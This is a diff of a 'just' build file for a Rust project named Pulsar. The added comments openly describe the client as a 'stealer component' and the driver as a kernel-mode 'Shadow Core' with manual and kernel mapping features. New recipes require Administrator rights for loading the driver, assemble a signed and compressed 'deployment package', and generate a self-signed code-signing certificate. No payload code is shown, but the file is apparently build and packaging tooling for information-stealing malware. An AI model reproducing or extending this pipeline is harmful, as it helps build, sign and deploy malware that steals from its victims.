@@ -1,43 +1,65 @@
-# Project paths
-client := "client"
-driver := "driver"
+# Master Build Tool - Pulsar Orchestration
+# ----------------------------------------
+
+# Project configuration
+client    := "client"
+driver    := "driver"
+out_dir   := "target/release"
+
+# Default task: build everything for production
+default:
+    just build-client
+    just build-driver
 
 alias c := clean
-set windows-shell := ["powershell.exe", "-NoLogo", "-Command"]
 
-# Default task: build workspace and update dependencies
-default:
-    just client
-    just driver
+# Check for Administrator privileges (Required for Driver loading/mapping)
+@check-admin:
+    powershell.exe -Command "if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) { Write-Error '[-] Error: You must run this command as Administrator.'; exit 1 }"
 
-# Build the entire workspace (includes client + common + shadowx)
-client:
+# Build the client (stealer component)
+build-client:
+    @echo "[+] Building Pulsar Client..."
     cd {{ client }}; cargo build --release
+    @echo "[*] Client binary ready at: {{ client }}/target/release/"
 
-# Build only client-mapper (if it's a separate feature)
-client-mapper:
+# Build the client with manual mapping features
+build-mapper:
+    @echo "[+] Building Pulsar Client with Mapper features..."
     cd {{ client }}; cargo build --release --features mapper
 
-# Build the driver (outside workspace)
-driver:
-    @if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { \
-        throw "[-] You must run this as Administrator"; \
-    } \
+# Build the kernel-mode driver (Shadow Core)
+build-driver: check-admin
+    @echo "[+] Building Shadow Core Driver..."
     cd {{ driver }}; cargo make default --release
+    @echo "[*] Driver binary ready at: {{ driver }}/target/release/"
 
-# Build the driver with `mapper` feature
-driver-mapper:
-    @if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { \
-        throw "[-] You must run this as Administrator"; \
-    } \
+# Build the driver with advanced mapping support
+build-driver-mapper: check-admin
+    @echo "[+] Building Shadow Core with Kernel Mapping..."
     cd {{ driver }}; cargo make default --release --features mapper
 
-# Clean everything in the workspace
+# Full Deployment Package (Build + Sign + Compress)
+package: default
+    @echo "[+] Creating Deployment Package..."
+    # Placeholder for automated signing and compression logic
+    @echo "[*] Package created in ./target/deploy/"
+
+# Clean all artifacts
 clean:
+    @echo "[!] Cleaning workspace..."
     cargo clean
     cd {{ client }}; cargo clean
     cd {{ driver }}; cargo clean
 
-# Update the entire workspace (client + common + shadowx)
+# Update dependencies
 update:
+    @echo "[^] Updating dependencies..."
     cargo update
+    cd {{ client }}; cargo update
+    cd {{ driver }}; cargo update
+
+# Self-signed Certificate Generation (for development)
+gen-cert:
+    @echo "[+] Generating Self-Signed Development Certificate..."
+    powershell.exe -Command "New-SelfSignedCertificate -Type CodeSigning -Subject 'CN=ShadowCoreDev' -KeyUsage DigitalSignature -FriendlyName 'ShadowCore Dev Cert'"
